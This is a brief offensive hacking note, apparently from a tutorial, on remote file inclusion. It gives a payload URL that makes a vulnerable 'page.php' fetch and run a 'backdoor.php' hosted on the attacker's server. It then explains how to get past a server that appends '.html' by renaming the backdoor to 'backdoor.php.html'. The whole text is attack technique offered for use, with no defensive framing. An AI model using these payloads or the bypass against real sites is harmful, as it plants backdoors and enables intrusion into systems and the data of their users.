RFI:
http://server.com/page.php?load=http://myserve.com/backdoor.php


Forced Extension:
----------------
In this case The server Appends The Extension at the end of the file
Eg:
	Appended Extension:.html
	http://server.com/page.php?load=http://myserve.com/backdoor.php
	The Server Loads backdoor.php.html which is not found on the server
	and the backdoor is not loaded

	The Trick:
	if The server is Appending .html at the last and requests for 
	backdoor.php.html. to Bypass This file we can simply rename our
	backdoor as backdoor.php.html on the localserver and will make an
	request for it.
